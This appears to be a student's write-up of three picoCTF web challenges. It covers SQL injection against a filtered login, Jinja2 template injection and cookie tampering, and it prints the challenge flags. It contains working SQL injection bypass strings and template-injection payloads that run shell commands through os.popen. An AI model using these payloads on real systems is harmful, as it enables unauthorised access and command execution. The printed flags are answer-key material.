# 1. Web Gauntlet

Can you beat the filters?
Log in as admin http://shape-facility.picoctf.net:61463/ http://shape-facility.picoctf.net:61463/filter.php

## Solution
- SQL injection is where an attacker interferes with queries in order to bypass login criteria. After looking some ideas up, I used commenting in order to bypass the first login screen. The final query was:
`SELECT * FROM users WHERE username='admin' --' AND password='e'`
- Then I looked into the other link that had filters for what injection techniques I could use, I couldn't use the normal commenting technique but I could use this:
`SELECT * FROM users WHERE username='admin' /*' AND password='e'`
- Now for the third round, I couldn't use that either so I tried piping and it worked:
`SELECT * FROM users WHERE username='ad'||'min';' AND password='e'`
- Fortunately, for the fourth and fifth rounds, piping wasn't blocked by the filters so I was able to use it again. Then I looked at `filter.php` to see the flag.

## Flag

`picoCTF{y0u_m4d3_1t_79a0ddc6}`

## Concepts Learned

I learned how SQL injection worked

## Notes

It surprisingly took me a long time to find any reading material on how to utilize sql injection properly.

## Resources

- https://github.com/payloadbox/sql-injection-payload-list
- https://stackoverflow.com/questions/59444879/what-is-the-correct-way-to-comment-in-sql
- https://portswigger.net/web-security/sql-injection



# 2. SSTI1

I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website here!

## Solution

- I first read that SSTI is similar to SQL injection except instead of just exploiting the code, we inject more code in order to get what we need.
- I first listed the files in order to look for the flag using: `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}`
- This gave me:
<img width="1758" height="485" alt="image" src="https://github.com/user-attachments/assets/01a0d751-414a-4c2f-8834-d0c09643d697" />

- Then I used: `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}` in order to read the flag:
<img width="1460" height="120" alt="image" src="https://github.com/user-attachments/assets/3648792e-87ff-40d7-b9e8-ebed1ff98521" />

## Flag

`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}`

## Concepts Learned

I learned what SSTI is and the basics of how to use it.

## Notes

Again, since this was a method of exploitation, I had trouble finding out how exactly to do it because I couldn't find the websites that helped immediately.

## Resources

- https://www.youtube.com/watch?v=x_1A9rCxREs
- https://medium.com/stolabs/ssti-vulnerability-server-side-template-injection-execution-and-exploration-286923651032



# 3. Cookies

Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:54219/

## Solution

- I used the inspect tool on chrome to change the value of the cookie until I found the one that returned the flag:

<img width="1919" height="693" alt="image" src="https://github.com/user-attachments/assets/5ec726cb-ddf8-43e6-9b0d-59f8ed58ffd7" />

<img width="1919" height="699" alt="image" src="https://github.com/user-attachments/assets/43a5f8df-9933-469e-b421-a4e1401ef19f" />

## Flag

`picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}`

## Concepts Learned

- I learned that a cookie is a small piece of data a web server stores on a user’s browser. 
- They usually hold session IDs, preferences, etc but over here I manipulated the values in order to get the flag.

## Notes
It took a long time to find the cookie value

## References

- https://en.wikipedia.org/wiki/HTTP_cookie
- https://developer.chrome.com/docs/devtools/application/cookies
